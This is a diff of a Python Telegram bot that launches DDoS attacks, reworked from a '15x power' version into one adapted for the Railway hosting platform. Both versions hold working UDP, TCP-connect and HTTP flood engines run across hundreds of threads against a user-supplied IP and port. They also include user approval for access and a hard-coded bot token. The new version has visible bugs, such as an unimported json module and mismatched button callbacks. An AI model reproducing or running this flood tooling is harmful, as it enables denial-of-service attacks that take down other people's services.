@@ -1,4 +1,4 @@
-# ddos_15x_power.py
+# ddos_railway_fixed.py
 import asyncio
 import logging
 import threading
@@ -6,7 +6,6 @@ import time
 import random
 import socket
 import re
-import json
 import os
 from datetime import datetime, timedelta
 import requests
@@ -19,657 +18,231 @@ from telegram.ext import (
     filters,
     ContextTypes
 )
-from functools import wraps
 
-# ---------- Logging ----------
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-# ---------- CONFIGURATION ----------
+# ---------- CONFIG ----------
 BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
-ADMIN_IDS = [8210011971]   # <-- Apni Telegram user ID daalo
+ADMIN_IDS = [8210011971]
 
-BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}
-MIN_PORT, MAX_PORT = 1, 65535
+BLOCKED_PORTS = {22,25,443,3389,8700,9031,17500,20000,20001}
+THREADS_LEVEL = {i: i*80 for i in range(1,16)}  # 15x = 1200 threads (safe for Railway)
+SOCKETS_PER_THREAD = 10
+DELAY = 0.0001
+HTTP_THREADS = 300
 
-# ========== 15x POWER SETTINGS ==========
-# Level 15 = 1500 threads, 15 sockets/thread, delay 0.00005 sec
-THREADS_PER_LEVEL = {i: i * 100 for i in range(1, 16)}  # 15 → 1500 threads
-MAX_LEVEL = 15
-SOCKETS_PER_THREAD = 15       # 15 sockets/thread
-DELAY_SEC = 0.00005           # 50 microseconds
-HTTP_THREADS = 500            # L7 threads
-
-# Default power level
-POWER_LEVEL = 10   # Start with 10x, user can increase to 15
-
-# Global attack state
+POWER_LEVEL = 10   # default 10x (800 threads)
 attack_running = False
-attack_threads = []
-current_attack = {
-    'ip': None, 'port': None, 'method': None, 'duration': 0,
-    'start_time': 0, 'packets': 0, 'message_id': None
-}
+current_attack = {'packets': 0, 'message_id': None}
 attack_lock = threading.Lock()
 user_data = {}
 
-# ---------- JSON Database ----------
+# ---------- NO DATABASE (Simple JSON) ----------
 USERS_FILE = "users.json"
-
 def load_users():
     if os.path.exists(USERS_FILE):
-        with open(USERS_FILE, 'r') as f:
+        with open(USERS_FILE) as f:
             return json.load(f)
     return {}
+def save_users(u):
+    with open(USERS_FILE,'w') as f:
+        json.dump(u,f)
+def is_approved(uid):
+    u = load_users().get(str(uid),{})
+    return u.get('approved',False)
+def approve(uid, days):
+    u=load_users()
+    u[str(uid)]={'approved':True,'expires':(datetime.now()+timedelta(days=days)).isoformat()}
+    save_users(u)
 
-def save_users(users):
-    with open(USERS_FILE, 'w') as f:
-        json.dump(users, f, indent=2)
-
-def get_user(user_id):
-    users = load_users()
-    return users.get(str(user_id))
-
-def create_user(user_id, username=""):
-    users = load_users()
-    if str(user_id) not in users:
-        users[str(user_id)] = {
-            "user_id": user_id,
-            "username": username,
-            "approved": False,
-            "expires_at": None,
-            "total_attacks": 0,
-            "created_at": datetime.now().isoformat()
-        }
-        save_users(users)
-    return users[str(user_id)]
-
-def approve_user(user_id, days):
-    users = load_users()
-    if str(user_id) in users:
-        expires = (datetime.now() + timedelta(days=days)).isoformat()
-        users[str(user_id)]["approved"] = True
-        users[str(user_id)]["expires_at"] = expires
-        save_users(users)
-        return True
-    return False
-
-def is_user_approved(user_id):
-    users = load_users()
-    user = users.get(str(user_id))
-    if not user or not user.get("approved"):
-        return False
-    expires = user.get("expires_at")
-    if expires and datetime.fromisoformat(expires) < datetime.now():
-        return False
-    return True
-
-def log_attack(user_id, ip, port, duration, status, method, packets):
-    logger.info(f"ATTACK LOG: user={user_id} target={ip}:{port} dur={duration} method={method} pkts={packets} status={status}")
-
-def get_blocked_ports_list():
-    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
-
-def admin_required(func):
-    @wraps(func)
-    async def wrapper(update, context, *args, **kwargs):
-        if update.effective_user.id not in ADMIN_IDS:
-            await update.message.reply_text("❌ Unauthorized")
-            return
-        return await func(update, context, *args, **kwargs)
-    return wrapper
-
-# ---------- CHECK IF TARGET IS REACHABLE (ICMP ping) ----------
-def is_host_reachable(ip):
-    """Simple ping check (works on Linux/Termux)"""
-    try:
-        response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
-        return response == 0
-    except:
-        return False
-
-# ---------- 15x POWER ATTACK ENGINES (FIXED) ----------
-def udp_flood_15x(ip, port, duration):
+# ---------- ATTACK ENGINES (Railway adapted) ----------
+def tcp_syn_flood(ip, port, duration):
     global attack_running, current_attack
-    timeout = time.time() + duration
-    port = int(ip) if ip.isdigit() else int(port)  # safety
-    port = int(port)
-    
-    # Create multiple UDP sockets
-    socks = []
-    for _ in range(SOCKETS_PER_THREAD):
+    end = time.time()+duration
+    while time.time()<end and attack_running:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            socks.append(s)
-        except:
-            pass
-    
-    payload = random._urandom(512)  # 512 bytes
-    
-    # Burst mode: send to all sockets in a loop with very small delay
-    while time.time() < timeout and attack_running:
-        for sock in socks:
-            try:
-                sock.sendto(payload, (ip, port))
-                with attack_lock:
-                    current_attack['packets'] += 1
-            except:
-                pass
-        # Adaptive delay: if speed > 1M pps, add tiny delay
-        time.sleep(DELAY_SEC)
-    
-    for sock in socks:
-        sock.close()
-
-def mixed_flood_15x(ip, port, duration):
-    global attack_running, current_attack
-    timeout = time.time() + duration
-    port = int(port)
-    
-    # UDP sockets
-    udp_socks = []
-    for _ in range(SOCKETS_PER_THREAD):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            udp_socks.append(s)
-        except:
-            pass
-    
-    payload = random._urandom(512)
-    
-    while time.time() < timeout and attack_running:
-        # UDP burst
-        for sock in udp_socks:
-            try:
-                sock.sendto(payload, (ip, port))
-                with attack_lock:
-                    current_attack['packets'] += 1
-            except:
-                pass
-        # TCP SYN every 10 iterations
-        if random.randint(1,10) == 1:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.1)
-                s.connect_ex((ip, port))
-                s.close()
-                with attack_lock:
-                    current_attack['packets'] += 1
-            except:
-                pass
-        time.sleep(DELAY_SEC)
-    
-    for sock in udp_socks:
-        sock.close()
-
-def http_emulate_flood_15x(target_url, duration):
-    global attack_running, current_attack
-    timeout = time.time() + duration
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
-        'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'keep-alive',
-    }
-    session = requests.Session()
-    while time.time() < timeout and attack_running:
-        try:
-            url = f"{target_url}?rand={random.randint(1,999999)}"
-            session.get(url, headers=headers, timeout=3, verify=False)
+            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.1)
+            s.connect_ex((ip,port))
+            s.close()
             with attack_lock:
-                current_attack['packets'] += 1
+                current_attack['packets']+=1
+            time.sleep(0.001)
+        except:
+            time.sleep(0.01)
+
+def http_flood(target_url, duration):
+    global attack_running, current_attack
+    end = time.time()+duration
+    session = requests.Session()
+    headers={'User-Agent':'Mozilla/5.0'}
+    while time.time()<end and attack_running:
+        try:
+            session.get(target_url, headers=headers, timeout=2)
+            with attack_lock:
+                current_attack['packets']+=1
             time.sleep(0.002)
         except:
             time.sleep(0.02)
     session.close()
 
-def http_connect_flood_15x(target_url, duration):
+def udp_flood(ip, port, duration):
     global attack_running, current_attack
-    timeout = time.time() + duration
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0',
-        'Connection': 'close',
-    }
-    session = requests.Session()
-    while time.time() < timeout and attack_running:
-        try:
-            resp = session.get(target_url, headers=headers, timeout=2, stream=True)
-            resp.close()
-            with attack_lock:
-                current_attack['packets'] += 1
-            time.sleep(0.003)
-        except:
-            time.sleep(0.03)
-    session.close()
-
-# ---------- Attack Launcher with Debug ----------
-def launch_attack(ip, port, duration, method, send_func):
-    global attack_running, attack_threads, current_attack
-
-    # Optional: Check if target is reachable (only for ICMP)
-    # if not is_host_reachable(ip):
-    #     send_func(f"⚠️ Target {ip} did not respond to ping. Attack may still work if port is open.", None)
-    
-    attack_running = True
-    with attack_lock:
-        current_attack = {
-            'ip': ip, 'port': port, 'method': method, 'duration': duration,
-            'start_time': time.time(), 'packets': 0, 'message_id': None
-        }
-
-    keyboard = [
-        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
-        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    # Select method
-    if method == 'udp':
-        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
-        target_func = udp_flood_15x
-        target_args = (ip, port, duration)
-        attack_type = f"UDP (15x, {num_threads} threads)"
-    elif method == 'mixed':
-        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
-        target_func = mixed_flood_15x
-        target_args = (ip, port, duration)
-        attack_type = f"Mixed (15x, {num_threads} threads)"
-    elif method == 'http_emulate':
-        num_threads = HTTP_THREADS
-        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
-        target_func = http_emulate_flood_15x
-        target_args = (target_url, duration)
-        attack_type = f"HTTP-Emulate (L7, {num_threads} threads)"
-    elif method == 'http_connect':
-        num_threads = HTTP_THREADS
-        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
-        target_func = http_connect_flood_15x
-        target_args = (target_url, duration)
-        attack_type = f"HTTP-Connect (L7, {num_threads} threads)"
-    else:
-        return
-
-    # Send initial message
-    start_msg = send_func(
-        f"💥 *15x POWER ATTACK STARTING* 💥\n\n"
-        f"🎯 Target: `{ip}:{port}`\n"
-        f"⚙️ Method: `{method.upper()}`\n"
-        f"🧵 Threads: `{num_threads}` (Level {POWER_LEVEL}x)\n"
-        f"⏱️ Duration: `{duration}s`\n"
-        f"🔧 Sockets/thread: `{SOCKETS_PER_THREAD}`\n"
-        f"_Sending first packets..._",
-        reply_markup, edit=False
-    )
-    if start_msg:
-        current_attack['message_id'] = start_msg.message_id
-
-    # Launch threads
-    attack_threads = []
-    for _ in range(num_threads):
-        t = threading.Thread(target=target_func, args=target_args, daemon=True)
-        t.start()
-        attack_threads.append(t)
-
-    # Monitor with real-time update
-    start_time = time.time()
-    last_update = 0
-    last_pkt = 0
-    while attack_running and (time.time() - start_time) < duration:
-        time.sleep(0.8)
-        elapsed = int(time.time() - start_time)
-        if time.time() - last_update >= 1.5:
-            last_update = time.time()
-            with attack_lock:
-                pkt = current_attack['packets']
-            speed = int((pkt - last_pkt) / 1.5) if last_pkt else 0
-            last_pkt = pkt
-            progress = int((elapsed / duration) * 20)
-            bar = "█" * progress + "░" * (20 - progress)
-            text = (
-                f"💥 *15x ATTACK IN PROGRESS* 💥\n\n"
-                f"🎯 `{ip}:{port}`\n"
-                f"⚙️ `{method.upper()}`\n"
-                f"📦 Packets: `{pkt:,}`\n"
-                f"⏱️ Time: `{elapsed}/{duration}s`\n"
-                f"📊 `[{bar}]`\n"
-                f"💥 Speed: `{speed:,}` pps\n"
-                f"🧵 Threads: `{num_threads}`\n\n"
-                f"🔘 Buttons below"
-            )
+    end = time.time()+duration
+    socks=[socket.socket(socket.AF_INET,socket.SOCK_DGRAM) for _ in range(SOCKETS_PER_THREAD)]
+    payload=random._urandom(512)
+    while time.time()<end and attack_running:
+        for s in socks:
             try:
-                send_func(text, reply_markup, edit=True, msg_id=current_attack['message_id'])
+                s.sendto(payload,(ip,port))
+                with attack_lock:
+                    current_attack['packets']+=1
             except:
                 pass
+        time.sleep(DELAY)
+    for s in socks:
+        s.close()
 
-    attack_running = False
-    for t in attack_threads:
-        t.join(timeout=0.5)
-    with attack_lock:
-        pkt = current_attack['packets']
-    avg_speed = int(pkt / duration) if duration else 0
-    text = (
-        f"✅ *15x ATTACK COMPLETED* ✅\n\n"
-        f"🎯 `{ip}:{port}`\n"
-        f"📦 Total Packets: `{pkt:,}`\n"
-        f"⏱️ Duration: `{duration}s`\n"
-        f"💥 Avg Speed: `{avg_speed:,}` pps\n"
-        f"🔋 Power: `{POWER_LEVEL}x`"
-    )
-    try:
-        send_func(text, None, edit=True, msg_id=current_attack['message_id'])
-    except:
-        pass
-
-    log_attack(ADMIN_IDS[0], ip, port, duration, "success", method, pkt)
-
-# ---------- TELEGRAM HANDLERS ----------
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    username = update.effective_user.username
-    create_user(user_id, username)
-
-    if user_id in ADMIN_IDS and not is_user_approved(user_id):
-        approve_user(user_id, 365)
-        await update.message.reply_text("✅ Admin auto-approved.")
-
-    if is_user_approved(user_id):
-        user_data[user_id] = {'step': 'ip'}
-        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]]
-        await update.message.reply_text(
-            "⚡ *15x POWER DDoS BOT* ⚡\n\n"
-            "Send target *IP address*:\nExample: `192.168.1.1`\n\n"
-            f"🔥 Current power: `{POWER_LEVEL}x` (max 15x)\n"
-            f"🧵 L4 threads: `{THREADS_PER_LEVEL[POWER_LEVEL]}`\n"
-            f"🔧 Use `/power 1-15` to change\n\n"
-            f"💡 *Tip*: If attack not visible, try `mixed` or `HTTP` methods.",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
-    else:
-        await update.message.reply_text("❌ Access Denied. Contact admin.")
-
-async def power_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global POWER_LEVEL
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized")
-        return
-    if not context.args:
-        await update.message.reply_text(
-            f"Current power: `{POWER_LEVEL}x` (1-15)\n"
-            f"L4 threads: `{THREADS_PER_LEVEL[POWER_LEVEL]}`\n"
-            f"Use `/power <1-15>`",
-            parse_mode='Markdown'
-        )
-        return
-    try:
-        level = int(context.args[0])
-        if 1 <= level <= MAX_LEVEL:
-            POWER_LEVEL = level
-            await update.message.reply_text(
-                f"✅ Power set to `{level}x`\n"
-                f"🔄 L4 threads: `{THREADS_PER_LEVEL[level]}`\n"
-                f"💥 New speed will be {level*100}k+ pps"
-            )
-        else:
-            await update.message.reply_text(f"❌ Level must be 1-{MAX_LEVEL}")
-    except:
-        await update.message.reply_text("❌ Invalid number")
-
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global attack_running
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized")
-        return
-    attack_running = False
-    await update.message.reply_text("🛑 Attack stopped")
-
-@admin_required
-async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 2:
-        await update.message.reply_text("❌ /approve <user_id> <days>")
-        return
-    try:
-        user_id = int(context.args[0])
-        days = int(context.args[1])
-        if approve_user(user_id, days):
-            await update.message.reply_text(f"✅ User {user_id} approved for {days} days")
-        else:
-            await update.message.reply_text("❌ User not found")
-    except:
-        await update.message.reply_text("❌ Invalid")
-
-@admin_required
-async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    users = load_users()
-    if not users:
-        await update.message.reply_text("No users")
-        return
-    msg = "👥 Users\n\n"
-    for uid, data in list(users.items())[:20]:
-        status = "✅" if data.get("approved") else "❌"
-        msg += f"`{uid}` {status} – {data.get('total_attacks',0)} attacks\n"
-    await update.message.reply_text(msg, parse_mode='Markdown')
-
-async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user = get_user(user_id)
-    if not user:
-        await update.message.reply_text("❌ Use /start first")
-        return
-    status = "✅ Approved" if user.get("approved") else "❌ Not approved"
-    expiry = user.get("expires_at")
-    exp_str = "Never"
-    if expiry:
-        days = (datetime.fromisoformat(expiry) - datetime.now()).days
-        exp_str = f"{days} days" if days >= 0 else "Expired"
-    await update.message.reply_text(
-        f"📋 *Your Account*\n\n"
-        f"🆔 `{user_id}`\n"
-        f"👤 @{user.get('username','N/A')}\n"
-        f"📊 {status}\n"
-        f"⏰ Expires: {exp_str}\n"
-        f"🎯 Attacks: {user.get('total_attacks',0)}",
-        parse_mode='Markdown'
-    )
-
-async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}", parse_mode='Markdown')
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    is_admin = user_id in ADMIN_IDS
-    msg = (
-        "🤖 *15x DDoS Bot Help*\n\n"
-        "/start – Setup attack\n"
-        "/power 1-15 – Set power\n"
-        "/stop – Stop attack\n"
-        "/myinfo – Account\n"
-        "/blockedports – Show blocked\n\n"
-        f"⚡ Current: {POWER_LEVEL}x → {THREADS_PER_LEVEL[POWER_LEVEL]} threads\n"
-        f"💡 Try *mixed* or *HTTP* if UDP not working"
-    )
-    if is_admin:
-        msg += "\n\n👑 Admin:\n/approve <id> <days>\n/users"
-    await update.message.reply_text(msg, parse_mode='Markdown')
-
-# ---------- Interactive Setup ----------
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_user_approved(user_id):
-        await update.message.reply_text("❌ Not approved")
-        return
-
-    step_data = user_data.get(user_id, {})
-    step = step_data.get('step')
-    text = update.message.text.strip()
-
-    if step == 'ip':
-        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
-            await update.message.reply_text("❌ Invalid IP. Send again:")
-            return
-        step_data['ip'] = text
-        step_data['step'] = 'port'
-        user_data[user_id] = step_data
-        await update.message.reply_text(f"🔌 Send *port* (1-65535):\n🚫 Blocked: {get_blocked_ports_list()}", parse_mode='Markdown')
-    elif step == 'port':
-        try:
-            port = int(text)
-            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
-                await update.message.reply_text("❌ Invalid or blocked port")
-                return
-            step_data['port'] = port
-            step_data['step'] = 'method'
-            user_data[user_id] = step_data
-            keyboard = [
-                [InlineKeyboardButton("🔥 UDP (15x)", callback_data="method_udp")],
-                [InlineKeyboardButton("💣 Mixed (UDP+TCP)", callback_data="method_mixed")],
-                [InlineKeyboardButton("🦊 HTTP-Emulate", callback_data="method_http_emulate")],
-                [InlineKeyboardButton("⚡ HTTP-Connect (RST)", callback_data="method_http_connect")],
-                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
-            ]
-            await update.message.reply_text("⚡ Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
-        except:
-            await update.message.reply_text("❌ Send a number")
-    elif step == 'duration':
-        try:
-            duration = int(text)
-            if duration < 5 or duration > 300:
-                await update.message.reply_text("❌ Duration 5-300 seconds")
-                return
-            ip = step_data['ip']
-            port = step_data['port']
-            method = step_data.get('method', 'udp')
-            step_data['final'] = (ip, port, duration, method)
-            step_data['step'] = 'confirm'
-            user_data[user_id] = step_data
-            keyboard = [
-                [InlineKeyboardButton("✅ START 15x ATTACK", callback_data="confirm_start")],
-                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
-            ]
-            await update.message.reply_text(
-                f"💥 *CONFIRM 15x ATTACK*\n\n"
-                f"🎯 `{ip}:{port}`\n"
-                f"⚙️ `{method.upper()}`\n"
-                f"⏱️ `{duration}s`\n"
-                f"🔋 Power: `{POWER_LEVEL}x` → {THREADS_PER_LEVEL[POWER_LEVEL]} threads\n\n"
-                f"⚠️ Start?",
-                parse_mode='Markdown',
-                reply_markup=InlineKeyboardMarkup(keyboard)
-            )
-        except:
-            await update.message.reply_text("❌ Send number")
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    data = query.data
-
-    if data == "cancel_setup":
-        if user_id in user_data:
-            del user_data[user_id]
-        await query.edit_message_text("❌ Setup cancelled")
-        return
-
-    if data.startswith("method_"):
-        method = data.replace("method_", "")
-        if user_id not in user_data:
-            user_data[user_id] = {}
-        user_data[user_id]['method'] = method
-        user_data[user_id]['step'] = 'duration'
-        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n⏱️ Send duration (5-300s):", parse_mode='Markdown')
-        return
-
-    if data == "confirm_start":
-        if user_id not in user_data or 'final' not in user_data[user_id]:
-            await query.edit_message_text("❌ Session expired. Use /start")
-            return
-        ip, port, duration, method = user_data[user_id]['final']
-        del user_data[user_id]
-
-        loop = asyncio.get_event_loop()
-        def sync_send(text, markup, edit=False, msg_id=None):
-            future = asyncio.run_coroutine_threadsafe(
-                query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup), loop
-            )
-            return future.result() if future.result() else None
-
-        threading.Thread(target=launch_attack, args=(ip, port, duration, method, sync_send), daemon=True).start()
-        await query.edit_message_text("💥 *15x Attack initializing...*\n_First packets in 2 seconds_", parse_mode='Markdown')
-        return
-
-    # Attack controls
+def launch_attack(ip,port,duration,method,send_cb):
     global attack_running, current_attack
-    if data == "stop_attack":
-        attack_running = False
-        await query.edit_message_text("🛑 Attack stopped")
-    elif data == "info_attack":
-        if attack_running:
-            with attack_lock:
-                pkt = current_attack['packets']
-                elapsed = int(time.time() - current_attack['start_time'])
-                remaining = current_attack['duration'] - elapsed
-                speed = int(pkt/elapsed) if elapsed else 0
-                await query.edit_message_text(
-                    f"ℹ️ *Attack Info*\n\n"
-                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
-                    f"📦 Packets: `{pkt:,}`\n"
-                    f"⏱️ Remaining: `{remaining}s`\n"
-                    f"💥 Speed: `{speed:,}` pps\n"
-                    f"🔋 Power: `{POWER_LEVEL}x`",
-                    parse_mode='Markdown'
-                )
-        else:
-            await query.edit_message_text("ℹ️ No active attack")
-    elif data == "refresh_attack":
-        if attack_running:
-            with attack_lock:
-                pkt = current_attack['packets']
-                elapsed = int(time.time() - current_attack['start_time'])
-                remaining = current_attack['duration'] - elapsed
-                progress = int((elapsed / current_attack['duration']) * 20)
-                bar = "█" * progress + "░" * (20 - progress)
-                speed = int(pkt/elapsed) if elapsed else 0
-                text = (
-                    f"💥 *15x ATTACK* 💥\n\n"
-                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
-                    f"📦 `{pkt:,}` pkts | ⏱️ `{elapsed}/{current_attack['duration']}s`\n"
-                    f"📊 `[{bar}]`\n"
-                    f"💥 `{speed:,}` pps\n\n"
-                    f"*Buttons:*"
-                )
-                keyboard = [
-                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
-                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
-                ]
-                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
-        else:
-            await query.edit_message_text("✅ No attack")
+    attack_running=True
+    with attack_lock:
+        current_attack={'packets':0,'start':time.time(),'duration':duration,'ip':ip,'port':port,'method':method}
+    
+    if method=='udp':
+        threads=THREADS_LEVEL[POWER_LEVEL]
+        target=udp_flood
+        args=(ip,port,duration)
+    elif method=='tcp':
+        threads=THREADS_LEVEL[POWER_LEVEL]
+        target=tcp_syn_flood
+        args=(ip,port,duration)
+    else: # http
+        threads=HTTP_THREADS
+        url=f"http://{ip}:{port}" if port!=443 else f"https://{ip}:{port}"
+        target=http_flood
+        args=(url,duration)
 
-async def error_handler(update, context):
-    logger.error(f"Error: {context.error}")
+    for _ in range(threads):
+        threading.Thread(target=target,args=args,daemon=True).start()
+    
+    # Monitor
+    start=time.time()
+    last_msg=0
+    while attack_running and time.time()-start<duration:
+        time.sleep(1)
+        if time.time()-last_msg>=2:
+            last_msg=time.time()
+            with attack_lock:
+                pkt=current_attack['packets']
+            elapsed=int(time.time()-start)
+            speed=int(pkt/elapsed) if elapsed else 0
+            bar='█'*int(20*elapsed/duration)+'░'*(20-int(20*elapsed/duration))
+            txt=(f"🔥 ATTACK ACTIVE 🔥\n{ip}:{port}\n📦 {pkt:,} pkts\n💥 {speed:,} pps\n{bar}\n/stop to halt")
+            send_cb(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP",callback_data="stop_attack")]]))
+    attack_running=False
+    send_cb(f"✅ Attack ended. Total packets: {current_attack['packets']:,}")
 
-# ---------- MAIN ----------
+# ---------- BOT HANDLERS (simplified) ----------
+async def start(update,context):
+    uid=update.effective_user.id
+    if uid not in ADMIN_IDS:
+        await update.message.reply_text("❌ Unauthorized")
+        return
+    user_data[uid]={'step':'ip'}
+    await update.message.reply_text("⚡ Send target IP:")
+
+async def handle(update,context):
+    uid=update.effective_user.id
+    if uid not in ADMIN_IDS: return
+    txt=update.message.text.strip()
+    step=user_data.get(uid,{}).get('step')
+    if step=='ip':
+        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',txt):
+            await update.message.reply_text("Invalid IP")
+            return
+        user_data[uid]['ip']=txt
+        user_data[uid]['step']='port'
+        await update.message.reply_text("Send port (1-65535):")
+    elif step=='port':
+        try:
+            p=int(txt)
+            if p in BLOCKED_PORTS or p<1 or p>65535:
+                raise ValueError
+            user_data[uid]['port']=p
+            user_data[uid]['step']='method'
+            kb=[[InlineKeyboardButton("TCP (recommended)",callback_data="tcp")],
+                [InlineKeyboardButton("UDP",callback_data="udp")],
+                [InlineKeyboardButton("HTTP",callback_data="http")]]
+            await update.message.reply_text("Select method:",reply_markup=InlineKeyboardMarkup(kb))
+        except:
+            await update.message.reply_text("Invalid port")
+    elif step=='duration':
+        try:
+            dur=int(txt)
+            if dur<5 or dur>300: raise ValueError
+            ip=user_data[uid]['ip']
+            port=user_data[uid]['port']
+            method=user_data[uid]['method']
+            del user_data[uid]
+            # Confirm
+            kb=[[InlineKeyboardButton("✅ START",callback_data=f"start_{ip}_{port}_{dur}_{method}")],
+                [InlineKeyboardButton("❌ Cancel",callback_data="cancel")]]
+            await update.message.reply_text(f"Target {ip}:{port}\nMethod {method}\nDuration {dur}s\nStart?",reply_markup=InlineKeyboardMarkup(kb))
+        except:
+            await update.message.reply_text("Duration 5-300 sec")
+
+async def button(update,context):
+    q=update.callback_query
+    await q.answer()
+    uid=q.from_user.id
+    data=q.data
+    if data.startswith("method_"):
+        method=data.split("_")[1]
+        user_data[uid]['method']=method
+        user_data[uid]['step']='duration'
+        await q.edit_message_text(f"Method {method}\nSend duration (5-300s):")
+    elif data.startswith("start_"):
+        _,ip,port,dur,method=data.split("_")
+        port=int(port); dur=int(dur)
+        def send_cb(text,reply_markup):
+            loop=asyncio.get_event_loop()
+            loop.create_task(q.message.reply_text(text,reply_markup=reply_markup))
+        threading.Thread(target=launch_attack,args=(ip,port,dur,method,send_cb),daemon=True).start()
+        await q.edit_message_text("🚀 Attack launching... use /stop")
+    elif data=="cancel":
+        if uid in user_data: del user_data[uid]
+        await q.edit_message_text("Cancelled")
+    elif data=="stop_attack":
+        global attack_running
+        attack_running=False
+        await q.edit_message_text("Stopped")
+
+async def stop_cmd(update,context):
+    global attack_running
+    attack_running=False
+    await update.message.reply_text("Attack stopped")
+
+async def power_cmd(update,context):
+    global POWER_LEVEL
+    if update.effective_user.id not in ADMIN_IDS: return
+    try:
+        lvl=int(context.args[0])
+        if 1<=lvl<=15:
+            POWER_LEVEL=lvl
+            await update.message.reply_text(f"Power set to {lvl}x → {THREADS_LEVEL[lvl]} threads")
+        else:
+            await update.message.reply_text("1-15 only")
+    except:
+        await update.message.reply_text("/power <1-15>")
+
 def main():
-    print("💥 15x POWER DDoS BOT STARTING 💥")
-    print(f"👑 Admins: {ADMIN_IDS}")
-    print(f"⚡ Default power: {POWER_LEVEL}x → {THREADS_PER_LEVEL[POWER_LEVEL]} threads")
-    print(f"🔧 Sockets/thread: {SOCKETS_PER_THREAD} → total {SOCKETS_PER_THREAD * THREADS_PER_LEVEL[POWER_LEVEL]} streams")
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("power", power_command))
-    app.add_handler(CommandHandler("stop", stop_command))
-    app.add_handler(CommandHandler("myinfo", myinfo_command))
-    app.add_handler(CommandHandler("blockedports", blocked_ports_command))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("approve", approve_command))
-    app.add_handler(CommandHandler("users", users_command))
-    app.add_handler(CallbackQueryHandler(button_callback))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_error_handler(error_handler)
-    print("✅ Bot is LIVE! Send /start on Telegram")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    app.add_handler(CommandHandler("start",start))
+    app.add_handler(CommandHandler("stop",stop_cmd))
+    app.add_handler(CommandHandler("power",power_cmd))
+    app.add_handler(CallbackQueryHandler(button))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
+    print("Bot running on Railway...")
+    app.run_polling()
 
-if __name__ == "__main__":
+if __name__=="__main__":
     main()
